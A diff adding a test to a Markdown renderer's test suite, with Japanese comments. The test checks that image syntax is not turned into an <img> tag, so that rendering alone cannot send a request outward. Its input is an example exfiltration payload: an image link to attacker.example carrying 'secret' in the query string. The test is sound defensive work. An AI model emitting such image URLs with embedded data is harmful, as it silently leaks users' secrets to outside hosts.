@@ -34,6 +34,14 @@ describe("renderMarkdown", () => {
     expect(html).not.toContain('href="javascript:');
   });
 
+  it("画像記法は <img> にしない（描画だけで外へ GET が出る経路を持たない。2026-10-30）", () => {
+    const html = renderMarkdown("本文 ![漏洩](https://attacker.example/leak?q=secret) 末尾");
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain('src="https://attacker.example');
+    // 文字は黙って消えない（`[漏洩](url)` はリンクとして残る。開くのは人のクリック）。
+    expect(html).toContain("漏洩");
+  });
+
   it("http リンクは新しいウィンドウ扱いの属性を持つ（webview 内で遷移しない保険）", () => {
     const html = renderMarkdown("[docs](https://example.com)");
     expect(html).toContain('href="https://example.com"');
